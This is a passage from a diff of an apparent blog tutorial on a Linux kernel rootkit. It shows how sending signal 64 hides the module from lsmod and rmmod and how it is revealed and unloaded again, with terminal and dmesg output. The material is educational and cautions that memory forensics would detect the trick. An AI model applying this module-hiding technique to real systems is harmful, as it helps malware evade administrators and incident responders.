-</code></pre></div><p>So there we go - now you can hide your rootkit from userspace! It&rsquo;s worth pointing out that this is a very thin layer of obfuscation. The fact that our rootkit is still running means that we are still in memory and any form of memory analysis or remotely capable DFIR professional would spot us very quickly (especially prancing around with a name like &ldquo;rootkit&rdquo;!).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ lsmod | grep rootkit
+</span></span><span style="display:flex;"><span>rootkit                <span style="color:#ae81ff">16384</span>  <span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><p>Now go ahead and send signal <code>64</code> to any pid and check again:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ kill -64 <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>$ lsmod | grep rootkit
+</span></span><span style="display:flex;"><span>$
+</span></span></code></pre></div><p>Nothing! We can check the output of <code>dmesg</code> to see that our module is still functioning:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ dmesg
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15107.466554<span style="color:#f92672">]</span> rootkit: Loaded &gt;:-<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15109.982025<span style="color:#f92672">]</span> rootkit: hiding rootkit kernel module...
+</span></span></code></pre></div><p>What if we try to unload the module?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo rmmod rootkit
+</span></span><span style="display:flex;"><span>rmmod: ERROR: ../libkmod/libkmod-module.c:799 kmod_module_remove_module<span style="color:#f92672">()</span> could not remove <span style="color:#e6db74">&#39;rootkit&#39;</span>: No such file or directory
+</span></span><span style="display:flex;"><span>rmmod: ERROR: could not remove module rootkit: No such file or directory
+</span></span></code></pre></div><p>It can&rsquo;t find it! This is because <code>rmmod</code> loops through every item in the linked list of modules looking for a <code>name</code> that matches the one we supplied. Because we aren&rsquo;t in the list, it can&rsquo;t find us! Sending signal <code>64</code> somewhere again brings us back and will let us unload the module.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> kill <span style="color:#f92672">-</span><span style="color:#ae81ff">64</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> sudo rmmod rootkit
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> dmesg
+</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">15107.466554</span>] rootkit: Loaded <span style="color:#f92672">&gt;:-</span>)
+</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">15109.982025</span>] rootkit: hiding rootkit kernel module...
+</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">15252.183065</span>] rootkit: revealing rootkit kernel module...
+</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">15255.439374</span>] rootkit: Unloaded :<span style="color:#f92672">-</span>(
+</span></span></code></pre></div><p>So there we go - now you can hide your rootkit from userspace! It&rsquo;s worth pointing out that this is a very thin layer of obfuscation. The fact that our rootkit is still running means that we are still in memory and any form of memory analysis or remotely capable DFIR professional would spot us very quickly (especially prancing around with a name like &ldquo;rootkit&rdquo;!).</p>
 <p>Hope you enjoyed this one - until next time&hellip;</p>
 
       </div></div>
